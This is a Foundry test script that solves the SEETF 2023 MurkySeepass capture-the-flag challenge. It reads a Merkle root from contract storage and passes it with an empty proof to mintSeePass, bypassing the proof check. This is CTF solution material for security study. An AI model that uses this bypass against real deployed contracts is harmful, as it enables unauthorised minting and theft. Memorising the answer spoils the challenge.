// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2 <0.9.0;

import "forge-std/Test.sol";
import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "src/SEETF_2023/MurkySeepass/Setup.sol";


contract Attacker is Test, Script {
    address deployer = makeAddr("deployer");
    uint256 attacker_key = vm.envUint("ATTACKER_KEY");
    address attacker = vm.addr(attacker_key);

    Setup setup;

    function setUp() public {
        vm.createSelectFork("mainnet");
        vm.startPrank(deployer, deployer);

        setup = new Setup(keccak256(abi.encode(1)));

        vm.stopPrank();
        console2.log("setUp done!");
    }

    function testExploit() public {
        vm.startPrank(attacker, attacker);

        solve();
        console2.log("isSolved: ", setup.isSolved());
        vm.stopPrank();

    }

    function solve() public {
        SEEPass pass = SEEPass(setup.pass());
        bytes32 root = vm.load(address(pass), bytes32(abi.encode(6)));
        pass.mintSeePass(new bytes32[](0), uint256(root));
    }

}


